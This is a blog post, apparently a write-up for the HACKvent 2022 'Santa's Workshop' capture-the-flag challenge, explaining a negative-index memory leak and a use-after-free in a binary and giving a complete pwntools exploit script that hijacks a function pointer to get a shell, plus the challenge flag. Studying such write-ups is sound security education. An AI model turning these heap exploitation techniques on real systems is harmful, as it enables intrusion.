@@ -1,0 +1,155 @@
+---
+title: "[HV22.21] Santa's Workshop"
+date: 2022-12-21 14:28:35 +0100
+tags: HV22 CTF exploit hard heap leak
+categories: HV22 hard
+sidebar:
+  nav: "hv22"
+---
+
+Santa decided to invite you to his workshop. Can you find a way to pwn it and find the flag?
+
+# Observation
+
+A classic exploitation, nice! Never successfully done that before (a.k.a. got lot's of help), but learned even more. Let's have a look at the provided [santasworkshop.elf](/assets/hv22/hv22_21_santasworkshop.elf), which also runs on the web socket, by exploring it manually.
+
+We got a main menu with 4 options:
+
+```
+Welcome to Santa's Workshop
+Enjoy your stay but don't steal anything!
+1 View naughty list
+2 Check the workshop for items
+3 Steal presents
+4 Tell a good deed
+```
+
+## Naughty list
+
+This option seems to read from a table and gives me back names for some low int values, and an error for numbers above. It doesn't seem to check for negative values since it just sends back an empty string for a few values I tried.
+
+## Check the workshop for items
+
+This option gives back the same thing:
+
+```
+Workshop Content:
+PIE
+Canary
+Flag
+```
+
+## Steal presents
+
+This leads to closing of the workshop. When I go the workshop again, after trying to steal things, the application segfaults. Interesting.
+
+## Tell a good deed
+
+This one asks me to provide the length of a deed and then for the text itself. If I enter something, it tells me `Cool, maybe you get a flag`. It's unusual that it asks me for a length and then for the content, while it could simply measure the length itself. I know an application has to reserve memory to save something and to do that, it has to know how long this something might be, which leads to vulnerabilities in multiple cases.
+
+# Solution
+
+Let's dig into the assembly of that to better understand what it does and how to get to a flag. Fire up Ghidra and have a look at the functions.
+
+![functions in the file](/assets/hv22/hv22_21_fuctions.png)
+
+Let's have a look at all of them:
+
+- main()
+  Does nothing fancy. It displays the 4 options and calls menu().
+- menu()
+  Waits for a key, but does something strange on option 2. It doesn't call the function directly but the memory address of workshop + 0x28. Let's keep that in mind.
+  ```c
+  if (pressedKey == 1) {
+    naughty();
+  }
+  else if (pressedKey == 2) {
+    (**(code **)(workshop + 0x28))();
+  }
+  else if (pressedKey == 3) {
+    steal();
+  }
+  else if (pressedKey == 4) {
+    tell_deed();
+  }
+  ```
+- naughty()
+  Does what I expected basically. It checks for `(int)input < 3`, which leaves open the negative inputs. It then accesses the memory instead of directly echoing the name, which looks like I can leak something here. Let's keep that in mind.
+- steal()
+  Here it closes the workshop and free's the memory where workshop was located. That's interesting, since that is why the program segfaults when I steal and call workshop again afterwards.
+- tell_deed()
+  Also does what I expected before. It asks me for the length and malloc's it directly. I can overwrite memory with that. Let's also keep that in mind.
+
+There are two more functions in there.
+
+- print()
+  Simply calls printf() on the address of workshop, which gets free'd and causes the segfault.
+- present()
+  Provides a shell but isn't referenced anywhere.
+
+So, let's make a plan. We know we want to execute `present()`. Since we got another place where memory is free's but called after the free (free() in steal, called in print() / option 2), we could possibly allocate that free'd memory again and put in the address of our `present()` function.
+
+Now we need to find out the location of our `present()` function. Luckily, we have `naughty()`, which leaks information if we enter negative numbers in it.
+
+So, throwing it together, we first try to find a function like this:
+
+```python
+from pwn import *
+from struct import *
+
+conn = remote('6c70354a-4b31-498a-85e8-86162d32451b.rdocker.vuln.land', 1337)
+
+# enumerate to find address of present() by entering negative values into naughty()
+
+address = ''
+for i in range(-255, -230):
+    _ = conn.recvuntil("> ")  # prompt
+    conn.sendline(b'1')  # 1 View naughty list
+    # Tell me an index and I will show you the entry
+    _ = conn.recvuntil('entry\n')
+    conn.sendline(f"{i}".encode())
+    res = conn.recvline()
+    res = res.strip()
+    if res != b'':
+        res = res.hex()
+        # reverse little endian
+        rev = "".join(reversed([res[i:i+2] for i in range(0, len(res), 2)]))
+        print(f"{i}: {res} -> {rev}")
+        # should end in c93, added after finding the address
+        if rev[-3:] == 'c93':
+            address = rev
+            break
+```
+
+This gives me a few functions, the one with `c93` in the end looks familiar, since it's the start of `menu()`, but that's good enough for an offset. My function is at `0010098a`, so `0x309` away.
+
+Next, we free the workshop's memory and inject our own function in there.
+
+```python
+# free workshop
+_ = conn.recvuntil("> ")  # prompt
+conn.sendline(b'3')  # 3 Steal persents to free workshop
+
+# inject
+address = int(address, 16)
+presentAddress = address - 0x309  # offset from disasm
+package = 0x28 * b'0' + p64(presentAddress)
+_ = conn.recvuntil("> ")  # prompt
+conn.sendline(b'4')  # 4 Tell a good deed
+_ = conn.recvuntil("deed?\n")  # How long is your deed?
+conn.sendline(b'48')  # length of the free()'d workshop
+_ = conn.recvuntil("deed")  # Okay, tell me the deed
+conn.sendline(package)
+conn.recvuntil("flag\n")  # Cool, maybe you get a flag
+```
+
+Finally, we get interactive to grab the flag:
+
+```python
+# get shell
+_ = conn.recvuntil("> ")  # prompt
+conn.sendline(b'2')  # 2 Check the workshop for items
+conn.interactive()
+```
+
+In `/challenge/FLAG` there was an ascii art of a flag, where I just pointed my phone at to get the flag `HV22{PWN_4_TH3_W1N}`
